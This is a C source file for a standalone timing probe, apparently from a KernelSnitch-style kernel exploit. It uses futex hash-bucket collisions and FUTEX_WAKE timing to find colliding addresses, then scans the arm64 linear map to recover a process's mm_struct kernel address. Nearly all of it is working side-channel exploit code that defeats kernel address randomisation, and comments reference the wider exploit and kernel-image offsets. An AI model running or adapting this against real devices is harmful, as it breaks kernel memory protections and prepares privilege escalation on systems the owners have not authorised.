/*
 * ksprobe - standalone KernelSnitch timing probe.
 *
 * Goal: find out, on THIS device, what the futex bucket-traversal signal
 * actually looks like, so the collision picker can be tuned with real numbers
 * instead of guesses.
 *
 * It answers four questions:
 *   1. is the piled address itself fast or slow?  (futex_wake() breaks out of
 *      the chain walk on the first key match, and nr_wake==0 means it really
 *      does break -- so the reference address should be FAST while every other
 *      address in the same bucket pays the full traversal)
 *   2. how large is the slow/fast ratio for a true same-bucket address?
 *   3. how many addresses out of N land in the piled bucket?  (expect N/hashsize)
 *   4. does the slowness disappear once the pile is woken?  (noise does not)
 */
#define _GNU_SOURCE
#include "kernelsnitch/utils.h"
#include "kernelsnitch/timeutils.h"
#include "kernelsnitch/futex_hash.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <pthread.h>
#include <unistd.h>
#include <stdarg.h>

/* utils.h routes every pr_*() through exlog_writef(); the real one lives in
 * util.c which pulls in the whole exploit. This probe only needs stdout. */
void exlog_writef(const char *level, const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    printf("[%s] ", level);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
}

#ifndef KSP_PILE
#define KSP_PILE 4096
#endif
#ifndef KSP_SAMPLES
#define KSP_SAMPLES 32768
#endif
#define KSP_REPS 128
#define KSP_AVG 8
#define KSP_PILE_OFF 128
#define KSP_REGION (1ULL << 28)   /* 256 MB -> 65536 pages */

static int __futex(unsigned int *uaddr, int op, unsigned int val,
                   const struct timespec *to, unsigned int *u2, unsigned int v3)
{
    return syscall(SYS_futex, uaddr, op, val, to, u2, v3);
}

static size_t *g_tmp;

static size_t measure(size_t addr)
{
    size_t best[KSP_AVG];
    for (int i = 0; i < KSP_AVG; ++i) best[i] = (size_t)-1;
    for (int l = 0; l < KSP_REPS; ++l) {
        sched_yield();
        size_t t0 = rdtsc_begin();
        __futex((unsigned int *)addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0);
        size_t dt = rdtsc_end() - t0;
        if (dt < best[KSP_AVG - 1]) {           /* keep KSP_AVG smallest */
            int j = KSP_AVG - 1;
            while (j > 0 && best[j - 1] > dt) { best[j] = best[j - 1]; j--; }
            best[j] = dt;
        }
    }
    size_t s = 0;
    for (int i = 0; i < KSP_AVG; ++i) s += best[i];
    return s / KSP_AVG;
}

struct inc_arg { size_t uaddr; size_t core; };
static void *inc_thread(void *arg)
{
    struct inc_arg *a = arg;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(a->core, &set);
    sched_setaffinity(0, sizeof(set), &set);
    __futex((unsigned int *)a->uaddr, FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0);
    return 0;
}

/* put n waiters on uaddr, measure list[], then wake them again */
static size_t pile_at(size_t uaddr, size_t *list, size_t n, size_t *out, size_t nthreads)
{
    pid_t parent = getpid();
    struct inc_arg *ia = calloc(nthreads, sizeof(*ia));
    size_t ncpus = (size_t)sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpus < 2) ncpus = 2;
    size_t created = 0;
    for (size_t i = 0; i < nthreads; ++i) {
        ia[i].uaddr = uaddr;
        ia[i].core = 1 + (i % (ncpus - 1));
        pthread_t tid;
        int r = pthread_create(&tid, 0, inc_thread, &ia[i]);
        if (r) { pr_warning("pthread_create failed at %zu (%d)\n", i, r); break; }
        if (getpid() != parent) return 0;
        created++;
    }
    for (int i = 0; i < 150; ++i) { sched_yield(); usleep(20000); }
    for (size_t i = 0; i < n; ++i) out[i] = measure(list[i]);
    __futex((unsigned int *)uaddr, FUTEX_WAKE_PRIVATE, (unsigned int)(created + 64),
            NULL, NULL, 0);
    for (int i = 0; i < 60; ++i) { sched_yield(); usleep(20000); }
    free(ia);
    return created;
}

static int cmp(const void *a, const void *b)
{
    size_t x = *(const size_t *)a, y = *(const size_t *)b;
    return (x > y) - (x < y);
}

/* Candidate replicas of hash_futex(), keyed by what the disassembly of
 * futex_wake()/get_futex_key() left ambiguous. Returns the pre-mask hash so the
 * caller can test several hashsize values from one computation. */
static uint32_t raw_hash(size_t addr, size_t mm, int v)
{
    uint32_t k[4];
    uint32_t page = (uint32_t)(addr & ~0xfffULL), pageh = (uint32_t)((addr & ~0xfffULL) >> 32);
    uint32_t raw = (uint32_t)addr, rawh = (uint32_t)(addr >> 32);
    uint32_t ml = (uint32_t)mm, mh = (uint32_t)(mm >> 32);
    uint32_t off = (uint32_t)(addr & 0xfff);
    switch (v) {
    case 0: k[0]=ml; k[1]=mh; k[2]=page; k[3]=pageh; return jhash2(k,4,off);
    case 1: k[0]=page; k[1]=pageh; k[2]=ml; k[3]=mh; return jhash2(k,4,off);
    case 2: k[0]=ml; k[1]=mh; k[2]=raw; k[3]=rawh; return jhash2(k,4,off);
    case 3: k[0]=raw; k[1]=rawh; k[2]=ml; k[3]=mh; return jhash2(k,4,off);
    case 4: k[0]=ml; k[1]=mh; k[2]=page; k[3]=pageh; return jhash2(k,4,0);
    case 5: k[0]=ml; k[1]=mh; return jhash2(k,2,off);
    default: return 0;
    }
}

/* jhash2(k, 4, init) specialised. Verified against jhash2() at startup.
 * Kernel constant: a = b = c = JHASH_INITVAL + (4<<2) + init = 0xdeadbeff+init,
 * which is exactly what futex_wake() materialises with
 *   mov w10,#0xbeff / movk w10,#0xdead,lsl#16 / add w10,w26,w10 */
static inline uint32_t jh4(uint32_t k0, uint32_t k1, uint32_t k2, uint32_t k3,
                           uint32_t init)
{
    uint32_t a, b, c;
    a = b = c = 0xdeadbeefu + 16u + init;
    a += k0; b += k1; c += k2;
    __jhash_mix(a, b, c);
    a += k3;
    __jhash_final(a, b, c);
    return c;
}

/* ---- parallel scan state ---- */
#define SCAN_MAX_MASKS 5
static const uint32_t g_masks[SCAN_MAX_MASKS] = {0x1ff, 0x3ff, 0x7ff, 0xfff, 0x1fff};
static const char *g_mname[SCAN_MAX_MASKS] = {"hs=512 ", "hs=1024", "hs=2048",
                                              "hs=4096", "hs=8192"};
#define SCAN_NMASK SCAN_MAX_MASKS

static size_t g_target;
static size_t g_ncoll;
static uint32_t g_tpg, g_tpgh, g_toff;
static uint32_t g_cpg[64], g_cpgh[64], g_coff[64];

struct sj {
    size_t start, end, stride;
    size_t best[SCAN_NMASK], bestaddr[SCAN_NMASK], full[SCAN_NMASK];
};

static void *scan_worker(void *arg)
{
    struct sj *j = arg;
    size_t span = (j->end - j->start + j->stride - 1) / j->stride;
    size_t next_report = span / 8, done = 0;
    size_t ncoll = g_ncoll;
    static __thread char buf[256];

    for (size_t cand = j->start; cand < j->end; cand += j->stride) {
        uint32_t mlo = (uint32_t)cand, mhi = (uint32_t)(cand >> 32);
        uint32_t ht = jh4(mlo, mhi, g_tpg, g_tpgh, g_toff);
        uint32_t hc0 = jh4(mlo, mhi, g_cpg[0], g_cpgh[0], g_coff[0]);
        for (int mk = 0; mk < SCAN_NMASK; ++mk) {
            uint32_t m = g_masks[mk];
            if ((ht & m) != (hc0 & m)) continue;
            size_t sc = 1;
            for (size_t i = 1; i < ncoll; ++i)
                if ((jh4(mlo, mhi, g_cpg[i], g_cpgh[i], g_coff[i]) & m) == (ht & m))
                    sc++;
            if (sc > j->best[mk]) { j->best[mk] = sc; j->bestaddr[mk] = cand; }
            if (sc >= ncoll) j->full[mk]++;
        }
        if (++done == next_report) {
            snprintf(buf, sizeof buf, "  ... scan %3zu%% at %016zx (best %zu/%zu)\n",
                     100 * done / span, cand, j->best[2], ncoll);
            pr_info("%s", buf);
            next_report += span / 8;
        }
    }
    return 0;
}

int main(int argc, char **argv)
{
    size_t ns = KSP_SAMPLES, np = KSP_PILE;
    if (argc > 1) ns = strtoul(argv[1], 0, 0);
    if (argc > 2) np = strtoul(argv[2], 0, 0);

    /* ---- tier 1: constants that come straight from the kernel image ---- */
    futex_init();
    size_t possible = 0;
    FILE *f = fopen("/sys/devices/system/cpu/possible", "r");
    if (f) { char l[64]; if (fgets(l, sizeof l, f)) possible = strtoul(l, 0, 10); fclose(f); }
    pr_info("hashsize=0x%lx online=%ld  pile=%zu samples=%zu\n",
            futex_hashsize, sysconf(_SC_NPROCESSORS_ONLN), np, ns);

    pin_to_core(0);

    unsigned char *pile = SYSCHK(mmap(0, 4096, PROT_READ | PROT_WRITE,
                                      MAP_ANON | MAP_PRIVATE, -1, 0));
    unsigned char *reg = SYSCHK(mmap(0, KSP_REGION, PROT_READ | PROT_WRITE,
                                     MAP_ANON | MAP_SHARED, -1, 0));
    size_t target = (size_t)&pile[KSP_PILE_OFF];

    size_t *addr = calloc(ns, sizeof(size_t));
    size_t *pre  = calloc(ns, sizeof(size_t));
    size_t *post = calloc(ns, sizeof(size_t));
    size_t *late = calloc(ns, sizeof(size_t));
    for (size_t i = 0; i < ns; ++i)
        addr[i] = (size_t)&reg[(i * 4096) % KSP_REGION] + (i * 8) % 4096;

    /* ---- baseline, unpiled ---- */
    for (size_t i = 0; i < ns; ++i) pre[i] = measure(addr[i]);
    size_t tgt_pre = measure(target);
    g_tmp = pre; qsort(g_tmp, ns, sizeof(size_t), cmp);
    size_t med_pre = pre[ns / 2];
    pr_info("baseline: target=%zu  sample_median=%zu  sample_p10=%zu\n",
            tgt_pre, med_pre, pre[ns / 10]);

    /* ---- pile the bucket ---- */
    pid_t parent = getpid();
    struct inc_arg *ia = calloc(np, sizeof(*ia));
    size_t ncpus = (size_t)sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpus < 2) ncpus = 2;
    size_t created = 0;
    for (size_t i = 0; i < np; ++i) {
        ia[i].uaddr = target;
        ia[i].core = 1 + (i % (ncpus - 1));
        pthread_t tid;
        int r = pthread_create(&tid, 0, inc_thread, &ia[i]);
        if (r) { pr_warning("pthread_create failed at %zu (%d)\n", i, r); break; }
        if (getpid() != parent) return 0;      /* fork safety */
        created++;
    }
    for (int i = 0; i < 200; ++i) { sched_yield(); usleep(20000); }
    pr_info("piled %zu waiters, target now=%zu\n", created, measure(target));

    /* ---- post-pile ---- */
    for (size_t i = 0; i < ns; ++i) post[i] = measure(addr[i]);

    /* ---- wake the pile, measure again: a true collider must recover ---- */
    __futex((unsigned int *)target, FUTEX_WAKE_PRIVATE, (unsigned int)(created + 64),
            NULL, NULL, 0);
    for (int i = 0; i < 100; ++i) { sched_yield(); usleep(20000); }
    pr_info("pile woken, target now=%zu\n", measure(target));
    for (size_t i = 0; i < ns; ++i) late[i] = measure(addr[i]);

    /* ---- report ---- */
    double hist[8] = {0};
    size_t cnt[8] = {0};
    const double edge[8] = {1.15, 1.3, 1.5, 2.0, 3.0, 5.0, 8.0, 1e9};
    size_t inb[8] = {0};
    for (size_t i = 0; i < ns; ++i) {
        double r = pre[i] ? (double)post[i] / (double)pre[i] : 0;
        for (int b = 0; b < 8; ++b)
            if (r < edge[b]) { inb[b]++; break; }
    }
    for (int b = 0; b < 8; ++b) { hist[b] = inb[b]; cnt[b] = inb[b]; }
    pr_info("ratio distribution (post/pre):\n");
    double lo = 0;
    for (int b = 0; b < 8; ++b) {
        pr_info("   %5.2f..%5.2f : %6zu  (%5.2f%%)\n", lo, edge[b], inb[b],
                100.0 * inb[b] / ns);
        lo = edge[b];
    }
    size_t exp = ns / futex_hashsize;
    pr_info("expected colliders for this sample: ~%zu\n", exp);

    /* top 24 by post time */
    size_t *idx = calloc(ns, sizeof(size_t));
    for (size_t i = 0; i < ns; ++i) idx[i] = i;
    for (size_t a = 0; a < ns && a < 24; ++a) {
        size_t best = a;
        for (size_t b = a + 1; b < ns; ++b)
            if (post[idx[b]] > post[idx[best]]) best = b;
        size_t t = idx[a]; idx[a] = idx[best]; idx[best] = t;
    }
    pr_info("top candidates:            addr        pre     post     late   r1    r2\n");
    for (size_t a = 0; a < 24 && a < ns; ++a) {
        size_t i = idx[a];
        double r1 = pre[i] ? (double)post[i] / pre[i] : 0;
        double r2 = pre[i] ? (double)late[i] / pre[i] : 0;
        pr_info("  %016zx %8zu %8zu %8zu %5.2f %5.2f\n",
                addr[i], pre[i], post[i], late[i], r1, r2);
    }
    /* ================= part 2: validate the hash model =================
     * The 7-odd addresses above share the piled bucket with `target`, so for
     * the real mm_struct every one of them must land in the same hash slot as
     * `target`. Any candidate mm that satisfies that many constraints at once
     * is the real one -- and the *number* of variants that can do it tells us
     * which replica of hash_futex() the kernel actually uses. */
    size_t coll[64];
    int ncoll = 0;
    for (size_t i = 0; i < ns && ncoll < 64; ++i)
        if (pre[i] && post[i] > pre[i] * 50 && late[i] < pre[i] * 3)
            coll[ncoll++] = addr[i];
    pr_info("verified colliders (slow only while piled): %d\n", ncoll);
    for (int i = 0; i < ncoll; ++i) pr_info("   coll %016zx\n", coll[i]);
    pr_info("target      %016zx\n", target);

    /* ---- part 1b: is "slow while piled" a genuine equivalence class?
     * If the signal really is "same futex hash bucket", then moving the pile
     * onto one of the colliders must keep EVERY collider (and the old target)
     * slow, and must leave unrelated addresses fast. If that fails, the timing
     * does not measure bucket identity and nothing downstream can work. */
    {
        size_t pr2[64], t2[64];
        int n2 = 0;
        for (int i = 0; i < ncoll && n2 < 40; ++i) pr2[n2++] = coll[i];
        pr2[n2++] = target;
        size_t ctrl_at = n2;
        for (int i = 0; i < 8; ++i) pr2[n2++] = addr[(size_t)(i * 1301 + 7) % ns];
        size_t ncre = pile_at(coll[0], pr2, (size_t)n2, t2, np);
        pr_info("--- pile moved to coll[0]=%016zx (%zu waiters) ---\n", coll[0], ncre);
        for (int i = 0; i < n2; ++i)
            pr_info("   %s %016zx  %8zu  (was %8zu %8zu)\n",
                    i >= ctrl_at ? "ctrl" : "coll", pr2[i], t2[i],
                    i < ncoll ? pre[i] : 0, i < ncoll ? post[i] : 0);
    }
    if (ncoll < 3) { pr_info("too few colliders, skip model scan\n"); return 0; }

    size_t ram = 0;
    f = fopen("/proc/meminfo", "r");
    if (f) {
        char l[256];
        while (fgets(l, sizeof l, f))
            if (!strncmp(l, "MemTotal:", 9)) { ram = strtoull(l + 9, 0, 10) << 10; break; }
        fclose(f);
    }
    /* ---- part 3: locate mm_struct ------------------------------------
     * arm64 4.19 randomises the *linear map base*, not just the image:
     *   arm64_memblock_init(): memstart_addr -= (((256G - ram)/1G) * seed << 14)
     *                                      & ~(1G - 1)
     * so the direct map sits at PAGE_OFFSET + k*1GB, k in [0,247], not at
     * PAGE_OFFSET. (in-image proof at 0x2588c18..0x2588c48 reading
     * memstart_offset_seed at 0x26993ac.) The whole 256 GB linear region has
     * to be swept -- that was the only reason the old PAGE_OFFSET+ram window
     * scored nothing but noise.
     *
     * Stride 64 is safe: kmem_cache_create_usercopy("mm_struct", 0x3a8, 0,
     * SLAB_HWCACHE_ALIGN|..., ...) rounds the 936-byte object up to a 64-byte
     * multiple (0x3c0) and SLUB puts objects at page_base + n*obj_size, so
     * every mm_struct address is 64-byte aligned. */
    size_t vstart = 0xffffffc000000000ULL;   /* PAGE_OFFSET, VA_BITS=39 */
    size_t vend = 0xFFFFFFFFC0000000ULL;     /* + 255 GB = max shift + ram */
    size_t stride = 64;
    if (argc > 3 && !strcmp(argv[3], "noscan")) { pr_info("done (scan skipped)\n"); return 0; }
    if (argc > 3) { size_t s = strtoul(argv[3], 0, 0); if (s >= 8) stride = s; }

    {   /* self-check the specialised hash against the reference jhash2() */
        uint32_t bad = 0;
        for (uint32_t i = 0; i < 4096; ++i) {
            uint32_t k[4] = {i * 2654435761u, i * 40503u, i * 97u, i * 7919u};
            uint32_t init = i * 31u;
            if (jh4(k[0], k[1], k[2], k[3], init) != jhash2(k, 4, init)) bad++;
        }
        pr_info("jh4 self-check vs jhash2: %u mismatches / 4096\n", bad);
        if (bad) return 0;
    }

    g_target = target;
    g_tpg = (uint32_t)(target & ~0xfffULL);
    g_tpgh = (uint32_t)((target & ~0xfffULL) >> 32);
    g_toff = (uint32_t)(target & 0xfff);
    g_ncoll = (size_t)ncoll;
    for (int i = 0; i < ncoll; ++i) {
        g_cpg[i] = (uint32_t)(coll[i] & ~0xfffULL);
        g_cpgh[i] = (uint32_t)((coll[i] & ~0xfffULL) >> 32);
        g_coff[i] = (uint32_t)(coll[i] & 0xfff);
    }

    size_t total = (vend - vstart + stride - 1) / stride;
    int nthr = (int)sysconf(_SC_NPROCESSORS_ONLN);
    if (nthr > 8) nthr = 8;
    if (nthr < 1) nthr = 1;
    if (argc > 4) { int t = atoi(argv[4]); if (t >= 1 && t <= 32) nthr = t; }
    pr_info("ram=%zu MB\n", ram >> 20);
    pr_info("scan %016zx..%016zx stride=%zu -> %zu candidates / %d threads\n",
            vstart, vend, stride, total, nthr);

    struct sj *jobs = calloc((size_t)nthr, sizeof(*jobs));
    pthread_t *tids = calloc((size_t)nthr, sizeof(*tids));
    size_t per = (total / (size_t)nthr) * stride;
    struct timeval tv0, tv1;
    gettimeofday(&tv0, 0);
    for (int t = 0; t < nthr; ++t) {
        jobs[t].stride = stride;
        jobs[t].start = vstart + (size_t)t * per;
        jobs[t].end = (t == nthr - 1) ? vend : jobs[t].start + per;
        if (pthread_create(&tids[t], 0, scan_worker, &jobs[t])) {
            pr_error("scan thread %d failed (stride too large?)\n", t);
            jobs[t].start = jobs[t].end;
        }
    }
    for (int t = 0; t < nthr; ++t) pthread_join(tids[t], 0);
    gettimeofday(&tv1, 0);
    double el = (double)(tv1.tv_sec - tv0.tv_sec) + (tv1.tv_usec - tv0.tv_usec) / 1e6;
    pr_info("scan finished in %.1f s (%.1f M cand/s)\n", el,
            el > 0 ? (double)total / el / 1e6 : 0.0);

    for (int mk = 0; mk < SCAN_NMASK; ++mk) {
        size_t b = 0, ba = 0, fu = 0;
        for (int t = 0; t < nthr; ++t) {
            if (jobs[t].best[mk] > b) { b = jobs[t].best[mk]; ba = jobs[t].bestaddr[mk]; }
            fu += jobs[t].full[mk];
        }
        pr_info("  %s best=%2zu/%d at %016zx   full=%zu\n",
                g_mname[mk], b, ncoll, ba, fu);
        if (b >= ncoll)
            pr_info("  *** mm_struct candidate %016zx  (linmap_off=%016zx) ***\n",
                    ba, (size_t)(ba - vstart));
    }

    pr_info("done\n");
    return 0;
}